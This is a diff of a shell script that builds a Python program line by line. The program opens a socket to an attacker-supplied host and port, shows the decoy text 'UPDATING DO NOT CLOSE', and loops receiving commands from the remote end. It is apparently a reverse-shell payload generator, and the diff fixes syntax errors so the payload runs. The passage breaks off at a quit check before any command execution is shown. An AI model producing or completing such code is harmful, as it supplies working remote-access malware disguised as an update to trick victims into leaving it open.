@@ -142,11 +142,11 @@ echo "HOST = '$ll1'">>output/$sec3.py
 echo "PORT = $ll2">>output/$sec3.py
 echo "s = socket.socket()">>output/$sec3.py
 echo "s.connect((HOST, PORT))">>output/$sec3.py
-echo "msg2 = 'UPDATING DO NOT CLOSE!">>output/$sec3.py
+echo "msg2 = 'UPDATING DO NOT CLOSE'!">>output/$sec3.py
 echo "msg = s.recv(1024).decode()">>output/$sec3.py
 echo "print('[*]log:', msg)">>output/$sec3.py
 echo "print(msg2)">>output/$sec3.py
-echo "while True">>output/$sec3.py
+echo "while True:">>output/$sec3.py
 echo "  cmd = s.recv(1024).decode()">>output/$sec3.py
 echo "  print(f'[*]log: {cmd}')">>output/$sec3.py
 echo "  if cmd.lower() == 'quit':">>output/$sec3.py
